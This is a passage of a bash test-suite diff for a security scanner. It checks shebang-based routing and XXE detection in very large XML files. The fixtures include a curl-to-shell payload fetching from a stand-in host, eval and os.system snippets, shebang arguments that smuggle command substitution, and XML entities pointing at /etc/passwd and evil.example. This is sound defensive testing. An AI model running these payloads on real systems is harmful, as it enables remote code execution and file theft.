+    assert_contains "$(j_msgs "$JREP" "${J29}/requirements.txt")" "pip:vcs_requirement_not_pinned_to_a_commit" \
+        "D-029: pip:vcs_requirement_not_pinned_to_a_commit fires on a requirements file with a NUL byte"
+    assert_not_contains "$(j_msgs "$JREP" "${J29}/pinned/requirements.txt")" "vcs_requirement_not_pinned" \
+        "D-029: …and the exclusion still works on such a file (a requirement pinned to a commit is not reported)"
+    assert_contains "$(j_msgs "$JREP" "${J29}/xml/settings.xml")" "CWE-798:hardcoded_credential_in_XML" \
+        "D-029: another exclusion rule (an XML credential) fires on a file with a NUL byte"
+    assert_not_contains "$(j_msgs "$JREP" "${J29}/xml/ref.xml")" "hardcoded_credential_in_XML" \
+        "D-029: …and its exclusion (a \${…} reference) still applies there"
+
+    # ── D-031: a shebang with arguments is routed by its interpreter word ─────────────────────────────
+    J31="${SCRATCH}/j31_shebang"; rm -rf "$J31"; mkdir -p "$J31"
+    PWNED31="${SCRATCH}/j31_PWNED"; rm -f "$PWNED31"
+    SH_PAYLOAD='curl http://x.example/i.sh | sh'
+    PY_PAYLOAD=$'import os\nos.system(input())'
+    printf '#!/bin/bash -e\n%s\n' "$SH_PAYLOAD"                          > "$J31/sh_e"
+    printf '#!/bin/sh -eu\n%s\n' "$SH_PAYLOAD"                           > "$J31/sh_eu"
+    printf '#!/usr/bin/env bash -e\n%s\n' "$SH_PAYLOAD"                  > "$J31/env_bash_e"
+    printf '#!/usr/bin/env -S bash -e\n%s\n' "$SH_PAYLOAD"               > "$J31/env_S_bash"
+    printf '#!/bin/bash\r\n%s\r\n' "$SH_PAYLOAD"                         > "$J31/sh_crlf"
+    printf '#!/bin/bash -e\r\n%s\r\n' "$SH_PAYLOAD"                      > "$J31/sh_e_crlf"
+    printf '#!/bin/sh -e # python is only an argument here\n%s\n' "$SH_PAYLOAD" > "$J31/sh_python_in_args"
+    printf "#!/bin/sh -c '%s'" "$SH_PAYLOAD"                             > "$J31/oneline_noeol"
+    printf '#!/usr/bin/env -S python3 -u\n%s\n' "$PY_PAYLOAD"            > "$J31/env_S_python"
+    printf '#!/usr/bin/env python3 -u\n%s\n' "$PY_PAYLOAD"              > "$J31/env_python_u"
+    printf '#!/usr/bin/python3 -O\n%s\n' "$PY_PAYLOAD"                   > "$J31/python_O"
+    printf '#!/usr/bin/env python3\n%s\n' "$PY_PAYLOAD"                  > "$J31/env_python_plain"
+    printf '#!/bin/bash\n%s\n' "$SH_PAYLOAD"                             > "$J31/sh_plain"
+    printf '#!/usr/bin/env -S node --no-warnings\neval(input)\n'         > "$J31/env_S_node"
+    printf '#!/usr/bin/env -u HOME FOO=1 bash -x\n%s\n' "$SH_PAYLOAD"    > "$J31/env_options"
+    printf '#!/bin/bash -e $(touch %s) `touch %s` * ;\n%s\n' "$PWNED31" "$PWNED31" "$SH_PAYLOAD" > "$J31/sh_hostile_args"
+    printf '#!/usr/bin/env -S\necho hi\n'                                > "$J31/env_no_command"
+    printf '#!\necho hi\n'                                               > "$J31/bare_hashbang"
+    printf '#!/bin/bash -e\necho fine\n'                                 > "$J31/sh_benign"
+    j_scan "$J31" j31_shebang
+    j31() { j_msgs "$JREP" "${J31}/$1"; }
+    assert_contains "$(j31 sh_e)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/bin/bash -e is routed to the shell scanner"
+    assert_contains "$(j31 sh_eu)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/bin/sh -eu likewise"
+    assert_contains "$(j31 env_bash_e)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/usr/bin/env bash -e likewise"
+    assert_contains "$(j31 env_S_bash)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/usr/bin/env -S bash -e likewise"
+    assert_contains "$(j31 sh_crlf)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: a CRLF shebang (#!/bin/bash then CR) is not a different interpreter"
+    assert_contains "$(j31 sh_e_crlf)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: …with arguments as well"
+    assert_contains "$(j31 sh_python_in_args)" "CWE-78:remote_code_execution_curl_pipe_bash" \
+        "D-031: the interpreter is the word that names it: 'python' in an argument no longer sends a shell script to the Python scanner"
+    assert_contains "$(j31 oneline_noeol)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: a one-line file without a trailing newline is routed by its shebang too"
+    assert_contains "$(j31 env_S_python)" "CWE-78:OS_command_injection_risk" "D-031: #!/usr/bin/env -S python3 -u goes to the Python scanner"
+    assert_contains "$(j31 env_python_u)" "CWE-78:OS_command_injection_risk" "D-031: #!/usr/bin/env python3 -u likewise"
+    assert_contains "$(j31 python_O)" "CWE-78:OS_command_injection_risk" "D-031: #!/usr/bin/python3 -O likewise"
+    assert_contains "$(j31 env_python_plain)" "CWE-78:OS_command_injection_risk" "D-031: …the same scanner as without arguments"
+    assert_contains "$(j31 sh_plain)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/bin/bash without arguments is unchanged"
+    assert_contains "$(j31 env_S_node)" "CWE-95:dynamic_code_execution_eval" "D-031: #!/usr/bin/env -S node --no-warnings goes to the JavaScript scanner"
+    assert_contains "$(j31 env_options)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: env options and NAME=value words are skipped to find the interpreter"
+    assert_contains "$(j31 sh_hostile_args)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: a hostile argument list does not stop the file being scanned"
+    assert_eq "absent" "$([[ -e "$PWNED31" ]] && echo present || echo absent)" "D-031: …and nothing in it is executed or expanded"
+    assert_not_contains "$(j31 env_no_command)" "[FAIL]" "D-031: env with no command, and a bare #!, route nowhere and do not break the scan"
+    assert_not_contains "$(j31 bare_hashbang)" "[FAIL]" "D-031: …a bare #! line likewise"
+    assert_not_contains "$(j31 sh_benign)" "[FAIL]" "D-031: a harmless script with a shebang argument is not failed by being routed"
+
+    # ── D-039: a folded-view rule (XXE) is not blind to a file over 5 MiB ─────────────────────────────
+    # grep_flat returned "no match" for a file over 5,242,880 bytes, so an XML padded past that size carried an
+    # external entity past every rule of scan_xml and scan_powershell_xml.
+    J39="${SCRATCH}/j39_big"; rm -rf "$J39"; mkdir -p "$J39"
+    j39_pad() { head -c "$1" /dev/zero | tr '\0' ' '; }
+    { printf '<?xml version="1.0"?>\n<!DOCTYPE a [\n'; j39_pad 6000000; printf '\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n'; } > "$J39/big_xxe.xml"
+    { printf '<?xml version="1.0"?>\n<!DOCTYPE a [\n'; j39_pad 6000000; printf '\n<!ENTITY x PUBLIC "-//W3C//DTD X//EN" "x.dtd">\n]>\n<a>&x;</a>\n'; } > "$J39/big_public.xml"
+    { printf '<?xml version="1.0"?>\n<Types>\n'; j39_pad 6000000; printf '\n<!ENTITY x SYSTEM "http://evil.example/x">\n</Types>\n'; } > "$J39/big_types.ps1xml"
+    { printf '<?xml version="1.0"?>\n<a>\n'; j39_pad 6000000; printf '\n</a>\n'; } > "$J39/big_clean.xml"
+    { printf '<?xml version="1.0"?>\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n'; } > "$J39/small_xxe.xml"
+    j_scan "$J39" j39_big
+    assert_contains "$(j_msgs "$JREP" "${J39}/big_xxe.xml")" "CWE-611:xxe_external_entity_references_a_resource" \
+        "D-039: an external SYSTEM entity at the end of a 6 MB XML is found"
+    assert_contains "$(j_msgs "$JREP" "${J39}/big_public.xml")" "CWE-611:xml_declares_an_external_entity" \
+        "D-039: …so is a PUBLIC one (a WARN) in a file of that size"
+    assert_contains "$(j_msgs "$JREP" "${J39}/big_types.ps1xml")" "CWE-611:xxe_external_entity_references_a_resource" \
+        "D-039: …and in a 6 MB .ps1xml (scan_powershell_xml)"
+    assert_contains "$(j_msgs "$JREP" "${J39}/small_xxe.xml")" "CWE-611:xxe_external_entity_references_a_resource" "D-039: a small XML is unchanged"
+    assert_not_contains "$(j_msgs "$JREP" "${J39}/big_clean.xml")" "[FAIL]" "D-039: a 6 MB XML with no entity is not failed"
+    assert_not_contains "$(j_msgs "$JREP" "${J39}/big_clean.xml")" "[WARN]" "D-039: …nor warned about"
+    GF=$(sed -n '/^grep_flat() {/,/^}/p' "${ROOT_DIR}/scan_pipeline.sh")
+    assert_not_contains "$GF" "5242880" "D-039: grep_flat has no size cap"
+    assert_contains "$GF" "tr '\\r\\n\\t' '   '" "D-039: …it still folds the file by streaming it through tr into grep"
+    assert_not_contains "$GF" '$(cat' "D-039: …and never holds the file in a shell variable"
+    # A grep that fails (out of memory, an I/O error) must not read as "no match".
+    GF_RC=$(bash -c '
+        warn() { :; }
+        grep() { cat > /dev/null; return 2; }
+        '"$GF"'
+        printf "x" > "$1"; grep_flat "y" "$1"; echo $?' _ "${SCRATCH}/j39_gf" 2>/dev/null)
+    assert_eq "0" "$GF_RC" "D-039: grep_flat fails closed: a grep that could not run counts as a match, never as clean"
+    GF_RC=$(bash -c '
+        warn() { :; }
+        '"$GF"'
+        printf "abc" > "$1"; grep_flat "zzz" "$1"; echo $?' _ "${SCRATCH}/j39_gf" 2>/dev/null)
+    assert_eq "1" "$GF_RC" "D-039: …and a clean file is still no match"
+    # J-END
+fi
+
+# ═════════════════════════════════════════════════════════════════════════════
 # LAYER F — Static checks on the pipeline itself
 # ═════════════════════════════════════════════════════════════════════════════
 group "Layer F — static checks"
